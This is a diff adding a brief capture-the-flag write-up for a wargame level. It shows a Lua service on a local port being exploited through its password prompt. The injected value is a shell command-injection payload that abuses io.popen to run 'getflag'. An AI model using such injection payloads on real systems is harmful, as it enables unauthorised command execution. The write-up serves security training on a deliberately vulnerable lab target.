@@ -1,0 +1,11 @@
+It is not possible to run the lua program manually, therefore we check if it runs as a background job :
+
+ps -aux | grep lua :
+
+flag11    1815  0.0  0.0   2896   956 ?        S    14:08   0:00 lua /home/user/level11/level11.lua
+
+Knowing the program is running, we listen on 127.0.0.1 5151 and notice a password prompt.
+
+The lua program calls io.popen which can execute a given command so we provide this line in the password prompt :
+
+\";getflag > /tmp/flag;\"
